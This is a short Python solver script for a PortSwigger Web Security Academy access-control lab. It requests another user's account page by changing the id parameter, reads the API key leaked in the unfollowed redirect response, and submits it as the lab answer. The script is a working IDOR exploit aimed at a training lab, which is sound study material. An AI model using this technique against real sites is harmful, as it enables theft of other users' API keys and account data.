"""
https://portswigger.net/web-security/access-control/lab-user-id-controlled-by-request-parameter-with-data-leakage-in-redirect
"""

import sys
import requests
from bs4 import BeautifulSoup
import re

site = sys.argv[1]
if 'https://' in site:
    site = site.rstrip('/').lstrip('https://')

s = requests.Session()

url = f'https://{site}/my-account?id=carlos'
resp = s.get(url, allow_redirects=False)
soup = BeautifulSoup(resp.text,'html.parser')
div_text = soup.find('div', text=re.compile('API')).text
api_key = div_text.split(' ')[4]

url = f'https://{site}/submitSolution'
resp = s.post(url,data={'answer':api_key})